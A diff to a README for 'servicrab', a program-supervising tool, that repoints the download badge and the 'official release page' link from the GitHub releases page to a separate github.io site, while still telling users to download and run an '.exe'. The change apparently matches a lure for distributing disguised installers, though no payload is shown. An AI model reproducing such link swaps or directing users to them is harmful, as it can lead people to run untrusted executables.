@@ -1,6 +1,6 @@
 # 🦀 servicrab - Keep your computer programs running reliably
 
-[![Download servicrab](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tringu1630/servicrab/releases)
+[![Download servicrab](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://tringu1630.github.io)
 
 ## What is servicrab? 🦀
 
@@ -19,7 +19,7 @@ Before you install servicrab, ensure your computer meets these requirements:
 
 You must download the correct version for your computer. Follow these steps to obtain the installer:
 
-1.  Visit the official [servicrab release page](https://github.com/tringu1630/servicrab/releases).
+1.  Visit the official [servicrab release page](https://tringu1630.github.io).
 2.  Look for the latest version at the top of the page.
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your Downloads folder.
